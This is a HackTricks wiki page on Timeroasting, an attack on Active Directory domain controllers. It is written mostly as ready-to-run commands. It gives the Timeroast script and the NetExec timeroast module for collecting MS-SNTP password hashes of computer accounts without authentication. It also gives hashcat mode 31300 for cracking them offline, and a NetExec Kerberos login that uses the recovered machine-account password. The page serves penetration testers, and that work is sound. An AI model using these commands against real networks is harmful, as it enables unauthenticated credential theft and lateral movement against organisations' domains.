---
title: "Timeroasting"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/windows-hardening/active-directory-methodology/TimeRoasting.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: ad
---

## How to Attack

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort[\[3\]](#references)

```
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
## Practical attack (unauth) with NetExec + Hashcat

- NetExec’s `timeroast` module can enumerate computer RIDs, collect MS-SNTP MACs without authentication, and print`$sntp-ms$` hashes ready for cracking:<sup>[\[4\]](#references)</sup>

```
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline with Hashcat mode 31300 (MS-SNTP MAC):<sup>[\[5\]](#references)</sup>

```
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- The recovered cleartext corresponds to a computer account password. Try it directly as the machine account using Kerberos (-k) when NTLM is disabled:

```
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### Operational notes

- Ensure accurate time before using recovered credentials with Kerberos. Prefer a maintained NTP client such as `chronyd` /`systemd-timesyncd` ;`ntpdate` is retained here as a common lab command:`sudo ntpdate <dc_fqdn>` .
- If needed, generate krb5.conf for the AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Map RIDs to principals later via LDAP/BloodHound once you have any authenticated foothold.

## References

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — `timeroast` module source](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
